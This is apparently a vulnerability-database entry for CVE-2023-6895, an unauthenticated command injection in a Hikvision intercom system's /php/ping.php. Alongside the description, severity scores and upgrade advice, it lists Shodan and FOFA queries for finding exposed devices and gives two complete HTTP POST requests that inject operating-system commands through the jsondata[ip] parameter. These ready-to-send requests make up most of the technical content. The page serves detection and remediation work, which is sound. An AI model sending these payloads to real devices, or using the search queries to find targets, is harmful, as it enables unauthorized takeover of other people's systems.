---
layout: post
cve_id: CVE-2023-6895
title: Hikvision IP ping.php - Command Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-6895.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-6895.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDk,archer
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary operating system commands
  via the jsondata[ip] parameter, potentially gaining complete control over the Hikvision
  Intercom Broadcasting System.

  '
remediation: 'Upgrade to Hikvision Intercom Broadcasting System version 4.1.0 or later.

  '
reference:
- https://vuldb.com/?ctiid.248254
- https://vuldb.com/?id.248254
- https://github.com/tanjiti/sec_profile
- https://github.com/wy876/POC
- https://github.com/xingchennb/POC-
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-6895
  cwe-id: CWE-78
  epss-score: 0.92185
  epss-percentile: 0.99697
  cpe: cpe:2.3:o:hikvision:intercom_broadcast_system:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: hikvision
  product: intercom_broadcast_system
  shodan-query: http.favicon.hash:"-1830859634"
  fofa-query: icon_hash="-1830859634"
tags:
- cve
- cve2023
- hikvision
- rce
- vuln
---

## üîç Vulnerability Description
A vulnerability was found in Hikvision Intercom Broadcasting System 3.0.3_20201113_RELEASE(HIK). It has been declared as critical. This vulnerability affects unknown code of the file /php/ping.php. The manipulation of the argument jsondata[ip] with the input netstat -ano leads to os command injection. The exploit has been disclosed to the public and may be used. Upgrading to version 4.1.0 is able to address this issue. It is recommended to upgrade the affected component. VDB-248254 is the identifier assigned to this vulnerability.


## üåê HTTP Request
```nohighlight
POST /php/ping.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Content-Length: 54
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
jsondata%5Btype%5D=99&jsondata%5Bip%5D=cmd /c ipconfig
```

```nohighlight
POST /php/ping.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Content-Length: 41
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
jsondata%5Btype%5D=99&jsondata%5Bip%5D=id
```

